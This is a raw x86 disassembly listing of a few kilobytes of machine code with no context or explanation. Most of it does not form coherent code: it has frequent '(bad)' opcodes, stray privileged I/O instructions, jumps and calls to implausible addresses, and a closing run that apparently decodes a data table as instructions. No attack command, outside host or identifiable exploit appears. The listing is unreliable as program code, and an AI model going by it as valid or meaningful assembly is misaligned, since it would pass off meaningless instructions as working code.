  433f60:	mov    esi,DWORD PTR [ebx]
  433f62:	cld    
  433f63:	xor    eax,edx
  433f65:	sub    esp,DWORD PTR [edi-0x75]
  433f68:	int    0xec
  433f6a:	sub    ecx,eax
  433f6c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433f72:	mov    esi,esp
  433f74:	call   0x34178cfd
  433f79:	inc    DWORD PTR [ebx]
  433f7b:	mov    edi,DWORD PTR [ebx]
  433f7d:	cld    
  433f7e:	jne    0x433fcd
  433f80:	mov    esi,DWORD PTR [ebx]
  433f82:	aam    0x8d
  433f84:	dec    ebp
  433f85:	or     BYTE PTR [ebx],dh
  433f87:	jb     0x433f8c
  433f89:	add    BYTE PTR [edi+0x45],bl
  433f8c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433f93:	xor    ebp,esp
  433f95:	xor    eax,edi
  433f97:	sub    edi,esp
  433f99:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433f9f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433fa6:	inc    ebp
  433fa7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433fad:	clc    
  433fae:	mov    eax,edi
  433fb0:	nop
  433fb1:	fadd   QWORD PTR [eax]
  433fb3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433fb9:	jmp    0x433f44
  433fbb:	mov    eax,DWORD PTR [ecx]
  433fbd:	fadd   DWORD PTR [eax]
  433fbf:	inc    ebp
  433fc0:	or     DWORD PTR [ebx],esi
  433fc2:	dec    eax
  433fc3:	add    edx,DWORD PTR [ebx-0x2d]
  433fc6:	dec    ebp
  433fc7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433fcd:	inc    ebp
  433fce:	push   ecx
  433fcf:	mov    dl,BYTE PTR [ecx-0xd]
  433fd2:	xor    ecx,DWORD PTR [ebp-0x45]
  433fd5:	(bad)  
  433fd7:	rol    BYTE PTR [eax],0xc1
  433fda:	ret    
  433fdb:	inc    ebp
  433fdc:	inc    ebp
  433fdd:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433fe3:	xor    eax,ebx
  433fe5:	add    eax,DWORD PTR [ebp+0x23]
  433fe8:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433fee:	cmp    edi,0xc
  433ff1:	dec    ebp
  433ff2:	inc    ebp
  433ff3:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433ff9:	inc    ebp
  433ffa:	mov    esi,DWORD PTR [ebx]
  433ffc:	clc    
  433ffd:	lea    eax,[ebp+0x45725407]
  434003:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434007:	xor    edi,DWORD PTR [eax]
  434009:	mov    ecx,0xff8b8d4d
  43400e:	push   esp
  43400f:	enter  0x4df7,0x23
  434013:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434019:	mov    eax,DWORD PTR [ebx]
  43401b:	loopne 0x434008
  43401d:	ret    0xc68b
  434020:	push   esp
  434021:	enter  0x9745,0x8b
  434025:	inc    ebp
  434026:	cld    
  434027:	mov    eax,edi
  434029:	clc    
  43402a:	ret    
  43402b:	ret    0xc645
  43402e:	mov    esi,DWORD PTR [ebx]
  434030:	cld    
  434031:	pop    esi
  434032:	mov    ebx,0x83458bc3
  434038:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43403c:	dec    ebp
  43403d:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  434045:	clc    
  434046:	fcom   DWORD PTR [ebp+0x45]
  434049:	mov    edi,DWORD PTR [eax]
  43404b:	adc    al,0x9c
  43404d:	inc    ebp
  43404e:	(bad)  
  43404f:	mov    ebx,eax
  434051:	adc    al,0x85
  434053:	cmp    al,0x1
  434056:	inc    ebp
  434057:	add    BYTE PTR [edx],bh
  434059:	dec    ebp
  43405a:	pushf  
  43405b:	mov    ebp,ecx
  43405d:	mov    eax,DWORD PTR [ebx]
  43405f:	nop
  434060:	add    BYTE PTR [eax],al
  434062:	inc    ebp
  434063:	mov    esi,DWORD PTR [ebx]
  434065:	add    eax,DWORD PTR [ebx]
  434067:	cmp    al,0x89
  434069:	mov    esp,esi
  43406b:	clc    
  43406c:	inc    ebp
  43406d:	inc    ebp
  43406e:	add    edx,DWORD PTR [esi+0xc]
  434071:	mov    edi,0x7ff0845
  434076:	in     al,dx
  434077:	(bad)  
  434078:	jne    0x434013
  43407a:	mov    esi,DWORD PTR [edx]
  43407c:	clc    
  43407d:	add    ebp,DWORD PTR [esi]
  43407f:	mov    edi,edi
  434081:	in     al,dx
  434082:	mov    DWORD PTR [ebp-0x10],eax
  434085:	xor    eax,DWORD PTR [ebp+0x3]
  434088:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434090:	(bad)  
  434091:	push   eax
  434092:	ret    
  434093:	call   0xd4ffca25
  434098:	call   0xffcf38e2
  43409d:	cmp    BYTE PTR [ebp+0x4d],al
  4340a0:	test   DWORD PTR [eax+0x74],ecx
  4340a3:	inc    ecx
  4340a4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4340aa:	ret    
  4340ab:	inc    eax
  4340ac:	dec    DWORD PTR [ebx+0x4945f8f0]
  4340b2:	push   eax
  4340b3:	dec    eax
  4340b4:	test   al,0xd0
  4340b6:	dec    eax
  4340b8:	mov    eax,DWORD PTR [ebp-0x14]
  4340bb:	mov    eax,DWORD PTR [ebp+0x38]
  4340be:	mov    eax,ecx
  4340c0:	fadd   DWORD PTR [ebx]
  4340c2:	dec    ebp
  4340c3:	inc    eax
  4340c4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4340ca:	inc    ebp
  4340cb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4340d1:	fadd   QWORD PTR [ebx]
  4340d3:	inc    ebp
  4340d4:	or     al,0x33
  4340d6:	dec    ebp
  4340d7:	add    edi,DWORD PTR [ebx]
  4340d9:	mov    DWORD PTR [edx-0x28],esi
  4340dc:	mov    eax,DWORD PTR [ebp-0x10]
  4340df:	mov    eax,DWORD PTR [eax+0x10]
  4340e2:	mov    eax,edi
  4340e4:	lock ret 
  4340e6:	inc    ecx
  4340e7:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  4340ed:	fsubr  st,st(5)
  4340ef:	test   DWORD PTR [eax],eax
  4340f1:	clc    
  4340f2:	push   0x45
  4340f4:	(bad)  
  4340f5:	cmp    ebp,esp
  4340f7:	pushf  
  4340f8:	inc    ebp
  4340f9:	(bad)  
  4340fa:	push   eax
  4340fb:	fsub   DWORD PTR [eax-0x7b]
  4340fe:	(bad)  
  4340ff:	clc    
  434100:	mov    eax,0xf8008584
  434105:	mov    eax,DWORD PTR [ebp-0x4]
  434108:	mov    edi,0x4585c3cc
  43410e:	clc    
  43410f:	mov    eax,DWORD PTR [ebp+0x14]
  434112:	cmp    BYTE PTR [ebp-0x64],al
  434115:	mov    edi,eax
  434117:	in     al,dx
  434118:	les    esi,FWORD PTR [ebp-0x7b]
  43411b:	mov    edi,eax
  43411d:	or     al,0x4d
  43411f:	dec    ebp
  434120:	mov    eax,ebp
  434122:	in     al,0xf2
  434124:	dec    ebp
  434125:	dec    DWORD PTR [ecx+0x4dc7e045]
  43412b:	fmul   DWORD PTR [ecx+0x4df8f085]
  434131:	inc    ebp
  434132:	mov    DWORD PTR [ebx],esi
  434134:	fadd   QWORD PTR [ebx]
  434136:	dec    ebp
  434137:	push   eax
  434138:	xor    eax,DWORD PTR [ebp+0x3]
  43413b:	push   eax
  43413c:	mov    DWORD PTR [eax+ebx*8],ebx
  43413f:	push   esi
  434141:	mov    eax,DWORD PTR [eax]
  434143:	lock cmp eax,0xf84e85c0
  434149:	inc    ebp
  43414a:	test   BYTE PTR [ebx],dh
  43414c:	add    DWORD PTR [ebx],eax
  43414e:	add    BYTE PTR [eax+0x4d],dl
  434151:	jne    0x434186
  434153:	lea    ecx,[ebx-0x7617fc44]
  434159:	div    ah
  43415b:	inc    DWORD PTR [ebp+0x45]
  43415e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  434164:	jb     0x4340f1
  434166:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43416d:	mov    ecx,DWORD PTR [ebp-0x10]
  434170:	xor    ecx,DWORD PTR [ebp+0x3]
  434173:	mov    edi,DWORD PTR [ebx]
  434175:	adc    BYTE PTR [ebp+0x41],dh
  434178:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43417e:	ret    
  43417f:	push   ss
  434180:	push   0x45
  434182:	lea    ecx,[ebx+0x4de80cb0]
  434188:	sti    
  434189:	add    edi,edi
  43418b:	or     BYTE PTR [ebp+0x4d],al
  43418e:	mov    ebp,DWORD PTR [ebx]
  434190:	xor    ebp,ecx
  434192:	mov    al,BYTE PTR [edx]
  434194:	add    eax,0xc7200
  434199:	jne    0x4341e8
  43419b:	lea    esi,[ebx]
  43419d:	mov    al,0xf
  43419f:	call   0xf3864
  4341a4:	shl    DWORD PTR [esi],0x84
  4341a7:	pushf  
  4341a8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4341ae:	mov    edi,DWORD PTR [ecx]
  4341b0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4341b7:	test   DWORD PTR [eax],eax
  4341b9:	clc    
  4341ba:	dec    ebp
  4341bb:	inc    ebp
  4341bc:	xor    edi,DWORD PTR [ebx]
  4341be:	setl   al
  4341c1:	(bad)  
  4341c2:	retf   
  4341c3:	rol    cl,1
  4341c5:	dec    ebp
  4341c6:	test   BYTE PTR [ebp+0x4d00cc01],cl
  4341cc:	inc    ebp
  4341cd:	lea    ecx,[ebx-0x75b2cc38]
  4341d3:	lea    eax,ds:0x4d72c4
  4341d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4341dc:	xor    ecx,edi
  4341de:	bswap  ebx
  4341e0:	ror    BYTE PTR [ebp-0x35],0xe9
  4341e4:	rol    DWORD PTR [ecx],0x84
  4341e7:	add    BYTE PTR [ecx],al
  4341e9:	cmp    BYTE PTR [eax],al
  4341eb:	pushf  
  4341ec:	inc    ebp
  4341ed:	jnp    0x8a4375f0
  4341f3:	mov    eax,DWORD PTR ds:0xcf72e8
  4341f9:	lock dec ebp
  4341fb:	retf   
  4341fc:	xor    ecx,DWORD PTR [ebp+0xf]
  4341ff:	mov    eax,eax
  434201:	fmul   st,st(3)
  434203:	test   ecx,0x1998484
  434209:	xor    al,BYTE PTR [eax]
  43420b:	mov    DWORD PTR [ebp-0x28],eax
  43420e:	mov    eax,DWORD PTR [ebp+0x33]
  434211:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434217:	ret    
  434218:	add    al,cl
  43421a:	dec    ebp
  43421b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  434221:	add    ecx,DWORD PTR ds:0xc7250
  434227:	inc    ebp
  434228:	rcl    DWORD PTR [eax+0x4d],0x2b
  43422c:	mov    edi,edi
  43422e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  434234:	jb     0x4341fd
  434236:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  43423d:	mov    esi,DWORD PTR [ebx]
  43423f:	cld    
  434240:	mov    cl,bh
  434242:	or     eax,0x372b6
  434247:	cmp    ecx,eax
  434249:	jne    0x4342c6
  43424f:	mov    eax,DWORD PTR [ebp-0x20]
  434252:	mov    eax,DWORD PTR [eax]
  434254:	xor    eax,edi
  434256:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  43425d:	mov    ecx,DWORD PTR [ebp-0x4]
  434260:	mov    ecx,edi
  434262:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434268:	jb     0x434279
  43426a:	add    BYTE PTR [edi-0x3f],dl
  43426d:	add    BYTE PTR [ebp-0x75],cl
  434270:	mov    esi,eax
  434272:	xor    eax,DWORD PTR [eax]
  434274:	mov    al,bh
  434276:	or     eax,0x497284
  43427b:	xor    al,cl
  43427d:	mov    ecx,DWORD PTR [ebp-0x4]
  434280:	mov    ecx,edi
  434282:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434288:	jb     0x434299
  43428a:	add    BYTE PTR [edi],dh
  43428c:	enter  0x8500,0x8b
  434290:	add    ah,bl
  434292:	add    BYTE PTR [eax],al
  434294:	inc    ebp
  434295:	(bad)  
  434296:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43429d:	mov    esi,DWORD PTR [edx-0x4]
  4342a0:	add    bh,cl
  4342a2:	dec    ebp
  4342a3:	mov    dh,0x8b
  4342a5:	add    esi,DWORD PTR [ebx]
  4342a7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4342ad:	add    BYTE PTR [eax],al
  4342af:	mov    eax,ecx
  4342b1:	loopne 0x434300
  4342b3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4342b9:	dec    ecx
  4342ba:	or     eax,0x8b7232
  4342bf:	in     al,0xc1
  4342c1:	or     DWORD PTR [ebp-0x31],ecx
  4342c4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  4342cb:	xor    dh,BYTE PTR [edx-0x75]
  4342ce:	add    al,dh
  4342d0:	enter  0x4f09,0xcf
  4342d4:	inc    ebp
  4342d5:	mov    WORD PTR [ebx-0x75cdccb7],cs
  4342db:	or     al,BYTE PTR ds:0xe4728b
  4342e1:	or     DWORD PTR [ebp-0x31],ecx
  4342e4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  4342eb:	cmp    dh,BYTE PTR [edx+0xf]
  4342ee:	add    bl,dl
  4342f0:	rol    DWORD PTR [eax],0x4d
  4342f3:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  4342f9:	(bad)  
  4342fa:	or     eax,0x497284
  4342ff:	xor    al,cl
  434301:	mov    ecx,DWORD PTR [ebp-0x20]
  434304:	mov    ecx,DWORD PTR [ecx]
  434306:	xor    ecx,edi
  434308:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43430f:	xor    cl,al
  434311:	mov    ecx,DWORD PTR [edi]
  434313:	fadd   QWORD PTR [ebp+0x9]
  434316:	call   0xffd03dea
  43431b:	dec    ecx
  43431c:	dec    ebp
  43431d:	xor    bh,BYTE PTR [ebx]
  43431f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  434323:	loopne 0x434321
  434325:	or     edi,eax
  434327:	iret   
  434328:	ret    
  434329:	mov    WORD PTR [ebp+0x4d],es
  43432c:	mov    esi,DWORD PTR [edx]
  43432e:	call   0x84530a6d
  434333:	(bad)  
  434334:	cdq    
  434335:	add    BYTE PTR [edx],dh
  434337:	mov    esi,DWORD PTR [ebx]
  434339:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43433f:	test   BYTE PTR [ebx],dh
  434341:	dec    ecx
  434342:	add    esi,DWORD PTR [edx]
  434344:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43434a:	dec    edi
  43434c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  434353:	xor    al,BYTE PTR [ebx]
  434355:	mov    edi,DWORD PTR [ebx]
  434357:	in     al,0x75
  434359:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43435f:	dec    ecx
  434360:	xor    esi,DWORD PTR [edx]
  434362:	lea    ecx,[edx]
  434364:	or     BYTE PTR [ebx+0x900f072],cl
  43436a:	ja     0x43433b
  43436c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  434373:	cmp    ch,al
  434375:	jne    0x43436a
  434377:	mov    edi,edi
  434379:	fadd   QWORD PTR [ebp+0x0]
  43437c:	mov    eax,edi
  43437e:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434385:	mov    edx,DWORD PTR [ebx]
  434387:	in     al,0x45
  434389:	or     DWORD PTR [ebx],esi
  43438b:	iret   
  43438c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434393:	xor    dl,BYTE PTR [eax-0x75]
  434396:	sbb    al,0xe0
  434398:	dec    DWORD PTR [ecx]
  43439a:	mov    ecx,edi
  43439c:	in     al,dx
  43439d:	mov    eax,es
  43439f:	dec    ecx
  4343a0:	mov    DWORD PTR [edx],esi
  4343a2:	fmul   QWORD PTR [edx]
  4343a4:	jne    0x434331
  4343a6:	(bad)  
  4343a7:	(bad)  
  4343a9:	or     DWORD PTR [ebp-0x31],eax
  4343ac:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  4343b3:	cmp    bh,bh
  4343b5:	jne    0x4343fc
  4343b7:	lea    ecx,[ebx-0x38372750]
  4343bd:	inc    ebx
  4343bf:	mov    eax,ecx
  4343c1:	mov    eax,0xa00c111
  4343c6:	jne    0x43440d
  4343c8:	mov    esi,DWORD PTR [ebx]
  4343ca:	test   al,0x3
  4343cc:	inc    ebp
  4343cd:	mov    DWORD PTR [eax-0xc],edx
  4343d0:	loop   0x434417
  4343d2:	push   DWORD PTR [ebx]
  4343d4:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4343da:	add    DWORD PTR [eax],eax
  4343dc:	mov    eax,edi
  4343de:	lods   al,BYTE PTR ds:[esi]
  4343df:	dec    ebp
  4343e0:	inc    ebp
  4343e1:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4343e7:	retf   
  4343e8:	mov    edx,ecx
  4343ea:	adc    al,0x84
  4343ec:	(bad)  
  4343ed:	std    
  4343ee:	ret    
  4343ef:	jmp    FWORD PTR [edi-0x2b7474bb]
  4343f5:	hlt    
  4343f6:	rol    edi,0x82
  4343f9:	ret    
  4343fa:	cld    
  4343fb:	enter  0x11ff,0x45
  4343ff:	inc    ebp
  434400:	pop    edi
  434401:	mov    ebx,DWORD PTR [ebx+0x14]
  434404:	ret    0xc7
  434407:	test   BYTE PTR [ebx+0x45325199],cl
  43440d:	jmp    0x43439a
  43440f:	push   0x8
  434411:	call   DWORD PTR [esi]
  434413:	in     al,dx
  434414:	add    BYTE PTR [ebp+0x1],0x50
  434418:	add    bh,ah
  43441a:	add    bh,bh
  43441c:	icebp  
  43441d:	mov    ecx,DWORD PTR [eax]
  43441f:	cld    
  434420:	pop    es
  434421:	dec    ebp
  434422:	shl    DWORD PTR [ebx],0x72
  434425:	add    eax,DWORD PTR [eax]
  434427:	cmp    edx,ecx
  434429:	je     0x43443b
  43442b:	mov    esi,DWORD PTR [ebp-0x4]
  43442e:	inc    edi
  434430:	or     al,0xc3
  434432:	jmp    FWORD PTR [edx-0x18]
  434435:	(bad)  
  434436:	sti    
  434437:	cwde   
  434438:	(bad)  
  434439:	call   0xffa13d44
  43443e:	or     al,0x45
  434440:	push   ebp
  434441:	sub    esp,0x18
  434444:	push   ebx
  434445:	inc    ebp
  434446:	mov    edi,edi
  434448:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43444f:	test   al,0x51
  434451:	inc    ebp
  434452:	push   ecx
  434453:	push   eax
  434454:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43445a:	add    ah,bh
  43445c:	(bad)  
  43445d:	dec    ebp
  43445e:	add    DWORD PTR [ebx],esi
  434460:	inc    ebp
  434461:	add    ecx,DWORD PTR [ebx+0x74943b]
  434467:	push   0xffffff8b
  434469:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43446f:	add    eax,DWORD PTR [ecx]
  434471:	or     BYTE PTR [eax],al
  434473:	call   0xff853c78
  434478:	mov    eax,DWORD PTR [ebp+0x14]
  43447b:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434481:	inc    ebp
  434482:	dec    ecx
  434483:	add    ebp,DWORD PTR [edx+0x14]
  434486:	push   0x8b3045
  43448b:	call   0x33ad9200
  434490:	inc    DWORD PTR [ebx]
  434492:	mov    DWORD PTR [edi],ecx
  434494:	mov    eax,ecx
  434496:	or     BYTE PTR [ebp-0x3d],cl
  434499:	cmp    eax,edi
  43449b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4344a0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4344a6:	adc    al,0xc9
  4344a8:	inc    ebp
  4344a9:	adc    BYTE PTR [eax+0x55],dl
  4344ac:	jne    0x43449a
  4344ae:	call   0xff54443e
  4344b3:	dec    ebp
  4344b4:	inc    ebp
  4344b5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4344bb:	add    BYTE PTR [ebx],bh
  4344bd:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4344c1:	push   ecx
  4344c2:	or     al,0x51
  4344c4:	dec    ebp
  4344c5:	xor    DWORD PTR [ebx],0xf320399
  4344cb:	cmp    eax,DWORD PTR [ebp+0x74]
  4344ce:	mov    edi,edi
  4344d0:	pop    edi
  4344d1:	adc    BYTE PTR [ebx+0x75],bl
  4344d4:	ret    0x50
  4344d7:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4344db:	(bad)  
  4344dc:	clc    
  4344dd:	mov    esp,ebp
  4344df:	pop    ecx
  4344e0:	mov    ecx,0xf80085c2
  4344e5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4344e8:	push   esi
  4344e9:	push   esi
  4344ea:	(bad)  
  4344eb:	lock add eax,DWORD PTR [ebp+0x44]
  4344ef:	mov    edx,DWORD PTR [eax]
  4344f1:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4344f5:	or     BYTE PTR [ecx+0x7],dl
  4344f8:	push   ecx
  4344f9:	ret    
  4344fa:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434500:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434506:	or     al,0x80
  434508:	jge    0x43450b
  43450a:	mov    DWORD PTR [eax],eax
  43450c:	and    al,0x8
  43450e:	cmp    DWORD PTR [ebp+0x10],eax
  434511:	mov    edx,DWORD PTR [esi]
  434513:	xchg   esp,eax
  434514:	dec    esp
  434515:	add    BYTE PTR [eax],dl
  434517:	mov    ecx,edx
  434519:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43451d:	dec    ebp
  43451e:	into   
  43451f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  434525:	mov    edx,DWORD PTR [eax+0x14]
  434528:	das    
  434529:	add    al,0x45
  43452b:	add    BYTE PTR [ebp+0x0],dh
  43452e:	mov    edi,edi
  434530:	and    al,0x50
  434532:	mov    eax,DWORD PTR [eax]
  434534:	and    al,0xd1
  434536:	xor    eax,DWORD PTR [esi]
  434538:	lea    eax,[ebp+0x8]
  43453b:	xor    esi,DWORD PTR [edx+0x3]
  43453e:	add    BYTE PTR [ecx+0x4510fc44],cl
  434544:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  43454a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  434554:	cmp    edi,edi
  434556:	pushf  
  434557:	mov    edi,edi
  434559:	or     BYTE PTR [esi+ecx*1],cl
  43455c:	jne    0x434521
  43455e:	call   0xc452a
  434563:	adc    BYTE PTR [ebp+eax*2+0xc],al
  434567:	mov    ebx,DWORD PTR [eax]
  434569:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43456d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  434575:	pop    esi
  434576:	(bad)  
  434577:	leave  
  434578:	call   DWORD PTR [eax]
  43457a:	call   DWORD PTR [ebp+0x24]
  43457d:	in     al,dx
  43457e:	jmp    esp
  434580:	and    al,0x83
  434582:	call   0xff7a4397
  434587:	pushf  
  434588:	inc    esp
  434589:	mov    DWORD PTR [esp],ecx
  43458c:	pop    esi
  43458d:	push   edi
  43458e:	in     eax,0x41
  434590:	ret    0x89
  434593:	and    al,0xe
  434595:	mov    edi,DWORD PTR [eax]
  434597:	and    al,0x75
  434599:	mov    edx,0x7750885
  43459e:	or     dl,bh
  4345a0:	call   FWORD PTR [ecx+0x3243224]
  4345a6:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  4345ac:	dec    DWORD PTR [esp]
  4345af:	jl     0x43453c
  4345b1:	adc    al,0xc
  4345b3:	dec    ebp
  4345b4:	cmp    DWORD PTR [ebp+0x1c],esi
  4345b7:	mov    ecx,DWORD PTR [eax]
  4345b9:	and    al,0x10
  4345bb:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  4345c2:	test   DWORD PTR [edi],ecx
  4345c4:	jge    0x434590
  4345c6:	push   0x8908ff4c
  4345cb:	jmp    0x4345f1
  4345cd:	adc    BYTE PTR [esp+eax*2-0x75],dh
  4345d1:	dec    esp
  4345d2:	pop    ebp
  4345d3:	ret    0x8999
  4345d6:	push   0x74f89cf8
  4345db:	jmp    0x434651
  4345dd:	mov    edi,0x104fd55f
  4345e2:	add    BYTE PTR [eax],dh
  4345e4:	adc    BYTE PTR ds:[eax],al
  4345e7:	or     edx,DWORD PTR gs:[eax]
  4345ea:	add    BYTE PTR [ecx],ch
  4345ec:	add    eax,0x35270010
  4345f1:	adc    BYTE PTR [eax],al
  4345f3:	std    
  4345f4:	dec    eax
  4345f5:	adc    BYTE PTR [eax],al
  4345f7:	(bad)  
  4345f8:	outs   dx,BYTE PTR ds:[esi]
  4345f9:	adc    BYTE PTR [eax],al
  4345fb:	sahf   
  4345fc:	xor    DWORD PTR [eax],edx
  4345fe:	add    BYTE PTR [esi+0x0],al
  434601:	adc    BYTE PTR [eax],al
  434603:	fs jae 0x434616
  434606:	add    BYTE PTR [ebx-0x20ffefac],bh
  43460c:	inc    ebp
  43460d:	inc    ebx
  43460e:	add    bl,ah
  434610:	inc    ebp
  434611:	inc    ebx
  434612:	add    bh,ah
  434614:	inc    ebp
  434615:	inc    ebx
  434616:	add    bl,ch
  434618:	inc    ebp
  434619:	inc    ebx
  43461a:	add    bh,ch
  43461c:	inc    ebp
  43461d:	inc    ebx
  43461e:	add    bl,dh
  434620:	inc    ebp
  434621:	inc    ebx
  434622:	add    bh,dh
  434624:	inc    ebp
  434625:	inc    ebx
  434626:	add    bl,bh
  434628:	inc    ebp
  434629:	inc    ebx
  43462a:	add    bh,bh
  43462c:	inc    ebp
  43462d:	inc    ebx
  43462e:	add    BYTE PTR [ebx],al
  434630:	inc    esi
  434631:	inc    ebx
  434632:	add    BYTE PTR [edi],al
  434634:	inc    esi
  434635:	inc    ebx
  434636:	add    BYTE PTR [eax+ebp*1+0x47180010],dl
  43463d:	adc    BYTE PTR [eax],al
  43463f:	adc    dh,BYTE PTR [ecx+0x10]
  434642:	add    BYTE PTR [edi+0x2c001065],al
  434648:	push   0x5aa20010
  43464d:	adc    BYTE PTR [eax],al
  43464f:	rol    DWORD PTR [eax+edx*1],0x0
  434653:	int    0x6f
  434655:	adc    BYTE PTR [eax],al
  434657:	aaa    
  434658:	inc    esi
  434659:	inc    ebx
  43465a:	add    BYTE PTR [ebx],bh
  43465c:	inc    esi
  43465d:	inc    ebx
  43465e:	add    BYTE PTR [edi],bh
  434660:	inc    esi
  434661:	inc    ebx
  434662:	add    BYTE PTR [ebx+0x46],al
  434665:	inc    ebx
  434666:	add    BYTE PTR [edi+0x46],al
  434669:	inc    ebx
  43466a:	add    BYTE PTR [ebx+0x46],cl
  43466d:	inc    ebx
  43466e:	add    BYTE PTR [edi+0x46],cl
  434671:	inc    ebx
  434672:	add    BYTE PTR [ebx+0x46],dl
  434675:	inc    ebx
  434676:	add    BYTE PTR [ebx+0x54001005],dh
  43467c:	push   ebp
  43467d:	adc    BYTE PTR [eax],al
  43467f:	sbb    bh,BYTE PTR [eax]
  434681:	adc    BYTE PTR [eax],al
  434683:	mov    edx,0x2f001013
  434688:	dec    edx
  434689:	adc    BYTE PTR [eax],al
  43468b:	inc    ecx
  43468c:	or     edx,DWORD PTR [eax]
  43468e:	add    BYTE PTR [ebx+0x19],ch
  434691:	adc    BYTE PTR [eax],al
  434693:	mov    esp,0x7700103e
  434698:	inc    esi
  434699:	inc    ebx
  43469a:	add    BYTE PTR [ebx+0x46],bh
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [edi+0x46],bh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [ebx-0x78ffbcba],al
  4346a8:	inc    esi
  4346a9:	inc    ebx
  4346aa:	add    BYTE PTR [ebx-0x70ffbcba],cl
  4346b0:	inc    esi
  4346b1:	inc    ebx
  4346b2:	add    BYTE PTR [ebx-0x50ffbcba],dl
  4346b8:	push   0x10
  4346ba:	add    al,bl
  4346bc:	imul   edx,DWORD PTR [eax],0x0
  4346bf:	sahf   
  4346c0:	push   ss
  4346c1:	adc    BYTE PTR [eax],al
  4346c3:	jle    0x4346ff
  4346c5:	adc    BYTE PTR [eax],al
  4346c7:	jbe    0x4346de
  4346c9:	adc    BYTE PTR [eax],al
  4346cb:	cmp    DWORD PTR [edi+0x10],edx
  4346ce:	add    BYTE PTR [ebp+0x59001066],bl
  4346d4:	adc    al,0x10
  4346d6:	add    BYTE PTR [edi-0x44ffbcba],dh
  4346dc:	inc    esi
  4346dd:	inc    ebx
  4346de:	add    BYTE PTR [edi-0x3cffbcba],bh
  4346e4:	inc    esi
  4346e5:	inc    ebx
  4346e6:	add    bh,al
  4346e8:	inc    esi
  4346e9:	inc    ebx
  4346ea:	add    bl,cl
  4346ec:	inc    esi
  4346ed:	inc    ebx
  4346ee:	add    bh,cl
  4346f0:	inc    esi
  4346f1:	inc    ebx
  4346f2:	add    bl,dl
  4346f4:	inc    esi
  4346f5:	inc    ebx
  4346f6:	add    BYTE PTR [ebx-0x6affef90],bh
  4346fc:	inc    ebp
  4346fd:	adc    BYTE PTR [eax],al
  4346ff:	dec    ebx
  434700:	dec    eax
  434701:	adc    BYTE PTR [eax],al
  434703:	dec    ebx
  434704:	popa   
  434705:	adc    BYTE PTR [eax],al
  434707:	adc    al,BYTE PTR [eax+edx*1]
  43470a:	add    dh,dl
  43470c:	push   ds
  43470d:	adc    BYTE PTR [eax],al
  43470f:	hlt    
  434710:	pop    ds
